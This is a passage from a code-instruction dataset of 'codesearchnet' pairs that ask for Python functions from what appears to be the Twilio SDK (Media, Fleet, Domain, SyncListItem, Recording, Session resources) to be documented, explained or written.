DailyPage(self._version, response, self._solution)", "response": "Retrieve a single page of DailyInstance records from the API. Request is executed immediately"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_instance(self, payload):\n        return DailyInstance(self._version, payload, account_sid=self._solution['account_sid'], )", "response": "Build an instance of DailyInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nstreams MediaInstance records from the API as a list.", "response": "def list(self, date_created_before=values.unset, date_created=values.unset,\n             date_created_after=values.unset, limit=None, page_size=None):\n        \"\"\"\n        Lists MediaInstance records from the API as a list.\n        Unlike stream(), this operation is eager and will load `limit` records into\n        memory before returning.\n\n        :param datetime date_created_before: The `YYYY-MM-DD` value of the resources to read\n        :param datetime date_created: The `YYYY-MM-DD` value of the resources to read\n        :param datetime date_created_after: The `YYYY-MM-DD` value of the resources to read\n        :param int limit: Upper limit for the number of records to return. list() guarantees\n                          never to return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, list() will attempt to read the limit\n                              with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.api.v2010.account.message.media.MediaInstance]\n        \"\"\"\n        return list(self.stream(\n            date_created_before=date_created_before,\n            date_created=date_created,\n            date_created_after=date_created_after,\n            limit=limit,\n            page_size=page_size,\n        ))"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get(self, sid):\n        return MediaContext(\n            self._version,\n            account_sid=self._solution['account_sid'],\n            message_sid=self._solution['message_sid'],\n            sid=sid,\n        )", "response": "Constructs a MediaContext\n\n        :param sid: The unique string that identifies this resource\n\n        :returns: twilio.rest.api.v2010.account.message.media.MediaContext\n        :rtype: twilio.rest.api.v2010.account.message.media.MediaContext"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get_instance(self, payload):\n        return MediaInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            message_sid=self._solution['message_sid'],\n        )", "response": "Build an instance of MediaInstance"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef fetch(self):\n        params = values.of({})\n\n        payload = self._version.fetch(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return MediaInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            message_sid=self._solution['message_sid'],\n            sid=self._solution['sid'],\n        )", "response": "Fetch a MediaInstance\n\n        :returns: Fetched MediaInstance\n        :rtype: twilio.rest.api.v2010.account.message.media.MediaInstance"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ngenerates an instance context for the resource", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: MediaContext for this MediaInstance\n        :rtype: twilio.rest.api.v2010.account.message.media.MediaContext\n        \"\"\"\n        if self._context is None:\n            self._context = MediaContext(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                message_sid=self._solution['message_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef devices(self):\n        if self._devices is None:\n            self._devices = DeviceList(self._version, fleet_sid=self._solution['sid'], )\n        return self._devices", "response": "Access the devices\n\n        :returns: twilio.rest.preview.deployed_devices.fleet.device.DeviceList\n        :rtype: twilio.rest.preview.deployed_devices.fleet.device.DeviceList"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef deployments(self):\n        if self._deployments is None:\n            self._deployments = DeploymentList(self._version, fleet_sid=self._solution['sid'], )\n        return self._deployments", "response": "Access the deployments\n\n        :returns: twilio.rest.preview.deployed_devices.fleet.deployment.DeploymentList\n        :rtype: twilio.rest.preview.deployed_devices.fleet.deployment.DeploymentList"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef certificates(self):\n        if self._certificates is None:\n            self._certificates = CertificateList(self._version, fleet_sid=self._solution['sid'], )\n        return self._certificates", "response": "Access the certificates\n\n        :returns: twilio.rest.preview.deployed_devices.fleet.certificate.CertificateList\n        :rtype: twilio.rest.preview.deployed_devices.fleet.certificate.CertificateList"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef keys(self):\n        if self._keys is None:\n            self._keys = KeyList(self._version, fleet_sid=self._solution['sid'], )\n        return self._keys", "response": "Access the keys\n\n        :returns: twilio.rest.preview.deployed_devices.fleet.key.KeyList\n        :rtype: twilio.rest.preview.deployed_devices.fleet.key.KeyList"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ngenerate an instance context for the node the context is capable of performing various actions.", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: FleetContext for this FleetInstance\n        :rtype: twilio.rest.preview.deployed_devices.fleet.FleetContext\n        \"\"\"\n        if self._context is None:\n            self._context = FleetContext(self._version, sid=self._solution['sid'], )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef update(self, friendly_name=values.unset,\n               default_deployment_sid=values.unset):\n        \"\"\"\n        Update the FleetInstance\n\n        :param unicode friendly_name: A human readable description for this Fleet.\n        :param unicode default_deployment_sid: A default Deployment SID.\n\n        :returns: Updated FleetInstance\n        :rtype: twilio.rest.preview.deployed_devices.fleet.FleetInstance\n        \"\"\"\n        return self._proxy.update(\n            friendly_name=friendly_name,\n            default_deployment_sid=default_deployment_sid,\n        )", "response": "Update the FleetInstance s related properties."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ncreating a new CredentialListInstance", "response": "def create(self, credential_list_sid):\n        \"\"\"\n        Create a new CredentialListInstance\n\n        :param unicode credential_list_sid: The SID of the Credential List that you want to associate with the trunk\n\n        :returns: Newly created CredentialListInstance\n        :rtype: twilio.rest.trunking.v1.trunk.credential_list.CredentialListInstance\n        \"\"\"\n        data = values.of({'CredentialListSid': credential_list_sid, })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return CredentialListInstance(self._version, payload, trunk_sid=self._solution['trunk_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nconstruct a CredentialListContext :param sid: The unique string that identifies the resource :returns: twilio.rest.trunking.v1.trunk.credential_list.CredentialListContext :rtype: twilio.rest.trunking.v1.trunk.credential_list.CredentialListContext", "response": "def get(self, sid):\n        \"\"\"\n        Constructs a CredentialListContext\n\n        :param sid: The unique string that identifies the resource\n\n        :returns: twilio.rest.trunking.v1.trunk.credential_list.CredentialListContext\n        :rtype: twilio.rest.trunking.v1.trunk.credential_list.CredentialListContext\n        \"\"\"\n        return CredentialListContext(self._version, trunk_sid=self._solution['trunk_sid'], sid=sid, )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nbuild an instance of CredentialListInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of CredentialListInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.trunking.v1.trunk.credential_list.CredentialListInstance\n        :rtype: twilio.rest.trunking.v1.trunk.credential_list.CredentialListInstance\n        \"\"\"\n        return CredentialListInstance(self._version, payload, trunk_sid=self._solution['trunk_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _proxy(self):\n        if self._context is None:\n            self._context = CredentialListContext(\n                self._version,\n                trunk_sid=self._solution['trunk_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context", "response": "Generate an instance context for the credential list"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef create(self, domain_name, friendly_name=values.unset,\n               voice_url=values.unset, voice_method=values.unset,\n               voice_fallback_url=values.unset, voice_fallback_method=values.unset,\n               voice_status_callback_url=values.unset,\n               voice_status_callback_method=values.unset,\n               sip_registration=values.unset):\n        \"\"\"\n        Create a new DomainInstance\n\n        :param unicode domain_name: The unique address on Twilio to route SIP traffic\n        :param unicode friendly_name: A string to describe the resource\n        :param unicode voice_url: The URL we should call when receiving a call\n        :param unicode voice_method: The HTTP method to use with voice_url\n        :param unicode voice_fallback_url: The URL we should call when an error occurs in executing TwiML\n        :param unicode voice_fallback_method: The HTTP method to use with voice_fallback_url\n        :param unicode voice_status_callback_url: The URL that we should call to pass status updates\n        :param unicode voice_status_callback_method: The HTTP method we should use to call `voice_status_callback_url`\n        :param bool sip_registration: Whether SIP registration is allowed\n\n        :returns: Newly created DomainInstance\n        :rtype: twilio.rest.api.v2010.account.sip.domain.DomainInstance\n        \"\"\"\n        data = values.of({\n            'DomainName': domain_name,\n            'FriendlyName': friendly_name,\n            'VoiceUrl': voice_url,\n            'VoiceMethod': voice_method,\n            'VoiceFallbackUrl': voice_fallback_url,\n            'VoiceFallbackMethod': voice_fallback_method,\n            'VoiceStatusCallbackUrl': voice_status_callback_url,\n            'VoiceStatusCallbackMethod': voice_status_callback_method,\n            'SipRegistration': sip_registration,\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return DomainInstance(self._version, payload, account_sid=self._solution['account_sid'], )", "response": "Create a new DomainInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get(self, sid):\n        return DomainContext(self._version, account_sid=self._solution['account_sid'], sid=sid, )", "response": "Constructs a DomainContext\n\n        :param sid: The unique string that identifies the resource\n\n        :returns: twilio.rest.api.v2010.account.sip.domain.DomainContext\n        :rtype: twilio.rest.api.v2010.account.sip.domain.DomainContext"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_instance(self, payload):\n        return DomainInstance(self._version, payload, account_sid=self._solution['account_sid'], )", "response": "Build an instance of DomainInstance"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef ip_access_control_list_mappings(self):\n        if self._ip_access_control_list_mappings is None:\n            self._ip_access_control_list_mappings = IpAccessControlListMappingList(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                domain_sid=self._solution['sid'],\n            )\n        return self._ip_access_control_list_mappings", "response": "Access the ip_access_control_list_mappings\n\n        :returns: twilio.rest.api.v2010.account.sip.domain.ip_access_control_list_mapping.IpAccessControlListMappingList\n        :rtype: twilio.rest.api.v2010.account.sip.domain.ip_access_control_list_mapping.IpAccessControlListMappingList"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef credential_list_mappings(self):\n        if self._credential_list_mappings is None:\n            self._credential_list_mappings = CredentialListMappingList(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                domain_sid=self._solution['sid'],\n            )\n        return self._credential_list_mappings", "response": "Access the credential_list_mappings\n\n        :returns: twilio.rest.api.v2010.account.sip.domain.credential_list_mapping.CredentialListMappingList\n        :rtype: twilio.rest.api.v2010.account.sip.domain.credential_list_mapping.CredentialListMappingList"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef auth(self):\n        if self._auth is None:\n            self._auth = AuthTypesList(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                domain_sid=self._solution['sid'],\n            )\n        return self._auth", "response": "Access the auth\n\n        :returns: twilio.rest.api.v2010.account.sip.domain.auth_types.AuthTypesList\n        :rtype: twilio.rest.api.v2010.account.sip.domain.auth_types.AuthTypesList"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ngenerates an instance context for the resource we are interested in", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: DomainContext for this DomainInstance\n        :rtype: twilio.rest.api.v2010.account.sip.domain.DomainContext\n        \"\"\"\n        if self._context is None:\n            self._context = DomainContext(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef update(self, friendly_name=values.unset, voice_fallback_method=values.unset,\n               voice_fallback_url=values.unset, voice_method=values.unset,\n               voice_status_callback_method=values.unset,\n               voice_status_callback_url=values.unset, voice_url=values.unset,\n               sip_registration=values.unset, domain_name=values.unset):\n        \"\"\"\n        Update the DomainInstance\n\n        :param unicode friendly_name: A string to describe the resource\n        :param unicode voice_fallback_method: The HTTP method used with voice_fallback_url\n        :param unicode voice_fallback_url: The URL we should call when an error occurs in executing TwiML\n        :param unicode voice_method: The HTTP method we should use with voice_url\n        :param unicode voice_status_callback_method: The HTTP method we should use to call voice_status_callback_url\n        :param unicode voice_status_callback_url: The URL that we should call to pass status updates\n        :param unicode voice_url: The URL we should call when receiving a call\n        :param bool sip_registration: Whether SIP registration is allowed\n        :param unicode domain_name: The unique address on Twilio to route SIP traffic\n\n        :returns: Updated DomainInstance\n        :rtype: twilio.rest.api.v2010.account.sip.domain.DomainInstance\n        \"\"\"\n        return self._proxy.update(\n            friendly_name=friendly_name,\n            voice_fallback_method=voice_fallback_method,\n            voice_fallback_url=voice_fallback_url,\n            voice_method=voice_method,\n            voice_status_callback_method=voice_status_callback_method,\n            voice_status_callback_url=voice_status_callback_url,\n            voice_url=voice_url,\n            sip_registration=sip_registration,\n            domain_name=domain_name,\n        )", "response": "Updates the properties of the DomainInstance with the specified parameters."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ncreates a new SyncListItemInstance", "response": "def create(self, data):\n        \"\"\"\n        Create a new SyncListItemInstance\n\n        :param dict data: The data\n\n        :returns: Newly created SyncListItemInstance\n        :rtype: twilio.rest.preview.sync.service.sync_list.sync_list_item.SyncListItemInstance\n        \"\"\"\n        data = values.of({'Data': serialize.object(data), })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return SyncListItemInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            list_sid=self._solution['list_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nstreaming SyncListItemInstance records from the API as a list. This operation lazily loads the records from the API and then returns a generator that yields up to limit records.", "response": "def list(self, order=values.unset, from_=values.unset, bounds=values.unset,\n             limit=None, page_size=None):\n        \"\"\"\n        Lists SyncListItemInstance records from the API as a list.\n        Unlike stream(), this operation is eager and will load `limit` records into\n        memory before returning.\n\n        :param SyncListItemInstance.QueryResultOrder order: The order\n        :param unicode from_: The from\n        :param SyncListItemInstance.QueryFromBoundType bounds: The bounds\n        :param int limit: Upper limit for the number of records to return. list() guarantees\n                          never to return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, list() will attempt to read the limit\n                              with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.preview.sync.service.sync_list.sync_list_item.SyncListItemInstance]\n        \"\"\"\n        return list(self.stream(order=order, from_=from_, bounds=bounds, limit=limit, page_size=page_size, ))"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef page(self, order=values.unset, from_=values.unset, bounds=values.unset,\n             page_token=values.unset, page_number=values.unset,\n             page_size=values.unset):\n        \"\"\"\n        Retrieve a single page of SyncListItemInstance records from the API.\n        Request is executed immediately\n\n        :param SyncListItemInstance.QueryResultOrder order: The order\n        :param unicode from_: The from\n        :param SyncListItemInstance.QueryFromBoundType bounds: The bounds\n        :param str page_token: PageToken provided by the API\n        :param int page_number: Page Number, this value is simply for client state\n        :param int page_size: Number of records to return, defaults to 50\n\n        :returns: Page of SyncListItemInstance\n        :rtype: twilio.rest.preview.sync.service.sync_list.sync_list_item.SyncListItemPage\n        \"\"\"\n        params = values.of({\n            'Order': order,\n            'From': from_,\n            'Bounds': bounds,\n            'PageToken': page_token,\n            'Page': page_number,\n            'PageSize': page_size,\n        })\n\n        response = self._version.page(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return SyncListItemPage(self._version, response, self._solution)", "response": "Retrieve a single page of SyncListItemInstance records from the API. Request is executed immediately"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get(self, index):\n        return SyncListItemContext(\n            self._version,\n            service_sid=self._solution['service_sid'],\n            list_sid=self._solution['list_sid'],\n            index=index,\n        )", "response": "Constructs a SyncListItemContext\n\n        :param index: The index\n\n        :returns: twilio.rest.preview.sync.service.sync_list.sync_list_item.SyncListItemContext\n        :rtype: twilio.rest.preview.sync.service.sync_list.sync_list_item.SyncListItemContext"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nbuild an instance of SyncListItemInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of SyncListItemInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.preview.sync.service.sync_list.sync_list_item.SyncListItemInstance\n        :rtype: twilio.rest.preview.sync.service.sync_list.sync_list_item.SyncListItemInstance\n        \"\"\"\n        return SyncListItemInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            list_sid=self._solution['list_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nfetching a SyncListItemInstance :returns: Fetched SyncListItemInstance :rtype: twilio.rest.preview.sync.service.sync_list.sync_list_item.SyncListItemInstance", "response": "def fetch(self):\n        \"\"\"\n        Fetch a SyncListItemInstance\n\n        :returns: Fetched SyncListItemInstance\n        :rtype: twilio.rest.preview.sync.service.sync_list.sync_list_item.SyncListItemInstance\n        \"\"\"\n        params = values.of({})\n\n        payload = self._version.fetch(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return SyncListItemInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            list_sid=self._solution['list_sid'],\n            index=self._solution['index'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _proxy(self):\n        if self._context is None:\n            self._context = SyncListItemContext(\n                self._version,\n                service_sid=self._solution['service_sid'],\n                list_sid=self._solution['list_sid'],\n                index=self._solution['index'],\n            )\n        return self._context", "response": "Generate an instance context for the object"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef fetch(self):\n        params = values.of({})\n\n        payload = self._version.fetch(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return BalanceInstance(self._version, payload, account_sid=self._solution['account_sid'], )", "response": "Fetch a BalanceInstance\n\n        :returns: Fetched BalanceInstance\n        :rtype: twilio.rest.api.v2010.account.balance.BalanceInstance"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nbuilding an instance of BalanceInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of BalanceInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.api.v2010.account.balance.BalanceInstance\n        :rtype: twilio.rest.api.v2010.account.balance.BalanceInstance\n        \"\"\"\n        return BalanceInstance(self._version, payload, account_sid=self._solution['account_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ncreate a new RecordingInstance", "response": "def create(self, recording_status_callback_event=values.unset,\n               recording_status_callback=values.unset,\n               recording_status_callback_method=values.unset, trim=values.unset,\n               recording_channels=values.unset):\n        \"\"\"\n        Create a new RecordingInstance\n\n        :param unicode recording_status_callback_event: The recording status changes that should generate a callback\n        :param unicode recording_status_callback: The callback URL on each selected recording event\n        :param unicode recording_status_callback_method: The HTTP method we should use to call `recording_status_callback`\n        :param unicode trim: Whether to trim the silence in the recording\n        :param unicode recording_channels: The number of channels that the output recording will be configured with\n\n        :returns: Newly created RecordingInstance\n        :rtype: twilio.rest.api.v2010.account.call.recording.RecordingInstance\n        \"\"\"\n        data = values.of({\n            'RecordingStatusCallbackEvent': serialize.map(recording_status_callback_event, lambda e: e),\n            'RecordingStatusCallback': recording_status_callback,\n            'RecordingStatusCallbackMethod': recording_status_callback_method,\n            'Trim': trim,\n            'RecordingChannels': recording_channels,\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return RecordingInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            call_sid=self._solution['call_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef page(self, date_created_before=values.unset, date_created=values.unset,\n             date_created_after=values.unset, page_token=values.unset,\n             page_number=values.unset, page_size=values.unset):\n        \"\"\"\n        Retrieve a single page of RecordingInstance records from the API.\n        Request is executed immediately\n\n        :param date date_created_before: The `YYYY-MM-DD` value of the resources to read\n        :param date date_created: The `YYYY-MM-DD` value of the resources to read\n        :param date date_created_after: The `YYYY-MM-DD` value of the resources to read\n        :param str page_token: PageToken provided by the API\n        :param int page_number: Page Number, this value is simply for client state\n        :param int page_size: Number of records to return, defaults to 50\n\n        :returns: Page of RecordingInstance\n        :rtype: twilio.rest.api.v2010.account.call.recording.RecordingPage\n        \"\"\"\n        params = values.of({\n            'DateCreated<': serialize.iso8601_date(date_created_before),\n            'DateCreated': serialize.iso8601_date(date_created),\n            'DateCreated>': serialize.iso8601_date(date_created_after),\n            'PageToken': page_token,\n            'Page': page_number,\n            'PageSize': page_size,\n        })\n\n        response = self._version.page(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return RecordingPage(self._version, response, self._solution)", "response": "Retrieve a single page of RecordingInstance records from the API. Request is executed immediately"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get_instance(self, payload):\n        return RecordingInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            call_sid=self._solution['call_sid'],\n        )", "response": "Build an instance of RecordingInstance"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nupdate the RecordingInstance :param RecordingInstance.Status status: The new status of the recording :param unicode pause_behavior: Whether to record or not during the pause period. :returns: Updated RecordingInstance :rtype: twilio.rest.api.v2010.account.call.recording.RecordingInstance", "response": "def update(self, status, pause_behavior=values.unset):\n        \"\"\"\n        Update the RecordingInstance\n\n        :param RecordingInstance.Status status: The new status of the recording\n        :param unicode pause_behavior: Whether to record or not during the pause period.\n\n        :returns: Updated RecordingInstance\n        :rtype: twilio.rest.api.v2010.account.call.recording.RecordingInstance\n        \"\"\"\n        data = values.of({'Status': status, 'PauseBehavior': pause_behavior, })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return RecordingInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            call_sid=self._solution['call_sid'],\n            sid=self._solution['sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nupdate the RecordingInstance s status", "response": "def update(self, status, pause_behavior=values.unset):\n        \"\"\"\n        Update the RecordingInstance\n\n        :param RecordingInstance.Status status: The new status of the recording\n        :param unicode pause_behavior: Whether to record or not during the pause period.\n\n        :returns: Updated RecordingInstance\n        :rtype: twilio.rest.api.v2010.account.call.recording.RecordingInstance\n        \"\"\"\n        return self._proxy.update(status, pause_behavior=pause_behavior, )"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nbuilding an instance of TranscriptionInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of TranscriptionInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.api.v2010.account.recording.transcription.TranscriptionInstance\n        :rtype: twilio.rest.api.v2010.account.recording.transcription.TranscriptionInstance\n        \"\"\"\n        return TranscriptionInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            recording_sid=self._solution['recording_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _proxy(self):\n        if self._context is None:\n            self._context = TranscriptionContext(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                recording_sid=self._solution['recording_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context", "response": "Generate an instance context for the resource we are interested in"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef create(self, messaging_service_sid, friendly_name=values.unset,\n               attributes=values.unset, date_created=values.unset,\n               date_updated=values.unset, created_by=values.unset):\n        \"\"\"\n        Create a new SessionInstance\n\n        :param unicode messaging_service_sid: The unique id of the SMS Service this session belongs to.\n        :param unicode friendly_name: The human-readable name of this session.\n        :param unicode attributes: An optional string metadata field you can use to store any data you wish.\n        :param datetime date_created: The date that this resource was created.\n        :param datetime date_updated: The date that this resource was last updated.\n        :param unicode created_by: Identity of the session's creator.\n\n        :returns: Newly created SessionInstance\n        :rtype: twilio.rest.messaging.v1.session.SessionInstance\n        \"\"\"\n        data = values.of({\n            'MessagingServiceSid': messaging_service_sid,\n            'FriendlyName': friendly_name,\n            'Attributes': attributes,\n            'DateCreated': serialize.iso8601_datetime(date_created),\n            'DateUpdated': serialize.iso8601_datetime(date_updated),\n            'CreatedBy': created_by,\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return SessionInstance(self._version, payload, )", "response": "Create a new SessionInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef participants(self):\n        if self._participants is None:\n            self._participants = ParticipantList(self._version, session_sid=self._solution['sid'], )\n        return self._participants", "response": "Access the participants\n\n        :returns: twilio.rest.messaging.v1.session.participant.ParticipantList\n        :rtype: twilio.rest.messaging.v1.session.participant.ParticipantList"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef messages(self):\n        if self._messages is None:\n            self._messages = MessageList(self._version, session_sid=self._solution['sid'], )\n        return self._messages", "response": "Access the messages\n\n        :returns: twilio.rest.messaging.v1.session.message.MessageList\n        :rtype: twilio.rest.messaging.v1.session.message.MessageList"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\naccessing the webhooks :returns: twilio.rest.messaging.v1.session.webhook.WebhookList :rtype: twilio.rest.messaging.v1.session.webhook.WebhookList", "response": "def webhooks(self):\n        \"\"\"\n        Access the webhooks\n\n        :returns: twilio.rest.messaging.v1.session.webhook.WebhookList\n        :rtype: twilio.rest.messaging.v1.session.webhook.WebhookList\n        \"\"\"\n        if self._webhooks is None:\n            self._webhooks = WebhookList(self._version, session_sid=self._solution['sid'], )\n        return self._webhooks"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nupdate the SessionInstance Domain", "response": "def update(self, friendly_name=values.unset, attributes=values.unset,\n               date_created=values.unset, date_updated=values.unset,\n               created_by=values.unset):\n        \"\"\"\n        Update the SessionInstance\n\n        :param unicode friendly_name: The human-readable name of this session.\n        :param unicode attributes: An optional string metadata field you can use to store any data you wish.\n        :param datetime date_created: The date that this resource was created.\n        :param datetime date_updated: The date that this resource was last updated.\n        :param unicode created_by: Identity of the session's creator.\n\n        :returns: Updated SessionInstance\n        :rtype: twilio.rest.messaging.v1.session.SessionInstance\n        \"\"\"\n        return self._proxy.update(\n            friendly_name=friendly_name,\n            attributes=attributes,\n            date_created=date_created,\n            date_updated=date_updated,\n            created_by=created_by,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef update(self, enabled=values.unset, webhook_url=values.unset,\n               webhook_method=values.unset):\n        \"\"\"\n        Update the ExportConfigurationInstance\n\n        :param bool enabled: The enabled\n        :param unicode webhook_url: The webhook_url\n        :param unicode webhook_method: The webhook_method\n\n        :returns: Updated ExportConfigurationInstance\n        :rtype: twilio.rest.preview.bulk_exports.export_configuration.ExportConfigurationInstance\n        \"\"\"\n        data = values.of({'Enabled': enabled, 'WebhookUrl': webhook_url, 'WebhookMethod': webhook_method, })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return ExportConfigurationInstance(\n            self._version,\n            payload,\n            resource_type=self._solution['resource_type'],\n        )", "response": "Update the ExportConfigurationInstance\n\n        :param bool enabled: The enabled\n        :param unicode webhook_url: The webhook_url\n        :param unicode webhook_method: The webhook_method\n\n        :returns: Updated ExportConfigurationInstance\n        :rtype: twilio.rest.preview.bulk_exports.export_configuration.ExportConfigurationInstance"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _proxy(self):\n        if self._context is None:\n            self._context = ExportConfigurationContext(\n                self._version,\n                resource_type=self._solution['resource_type'],\n            )\n        return self._context", "response": "Generate an instance context for the resource that contains a specific resource."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef update(self, enabled=values.unset, webhook_url=values.unset,\n               webhook_method=values.unset):\n        \"\"\"\n        Update the ExportConfigurationInstance\n\n        :param bool enabled: The enabled\n        :param unicode webhook_url: The webhook_url\n        :param unicode webhook_method: The webhook_method\n\n        :returns: Updated ExportConfigurationInstance\n        :rtype: twilio.rest.preview.bulk_exports.export_configuration.ExportConfigurationInstance\n        \"\"\"\n        return self._proxy.update(enabled=enabled, webhook_url=webhook_url, webhook_method=webhook_method, )", "response": "Update the ExportConfigurationInstance\n\n        :param bool enabled: The enabled\n        :param unicode webhook_url: The webhook_url\n        :param unicode webhook_method: The webhook_method\n\n        :returns: Updated ExportConfigurationInstance\n        :rtype: twilio.rest.preview.bulk_exports.export_configuration.ExportConfigurationInstance"}
